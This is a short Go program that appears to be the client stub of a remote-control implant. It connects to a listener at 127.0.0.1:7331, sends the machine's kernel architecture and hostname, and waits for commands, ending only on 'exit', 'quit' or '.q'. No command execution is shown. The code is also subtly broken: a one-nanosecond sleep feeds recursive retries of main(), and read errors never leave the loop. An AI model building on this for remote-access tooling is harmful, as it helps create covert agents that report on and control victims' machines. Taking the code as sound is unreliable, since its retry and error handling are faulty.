package main

import (
	"fmt"
	"github.com/shirou/gopsutil/host"
	"net"
	"strings"
	"time"
)

func main() {
	Host := "127.0.0.1"
	Port := 7331

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", Host, Port))
	if err != nil { fmt.Println(err); time.Sleep(1); main() }

	hostStat, _ := host.Info()
	arch := hostStat.KernelArch
	conn.Write([]byte(arch))
	conn.Write([]byte(hostStat.Hostname))

	for {
		var buffer [1024]byte
		n, err := conn.Read(buffer[0:])
		if err != nil { fmt.Println(err) }

		line := strings.TrimSpace(string(buffer[0:n]))

		if line == "exit" || line == "quit" || line == ".q" {
			fmt.Println("Killed")
			return
		}
	}

}
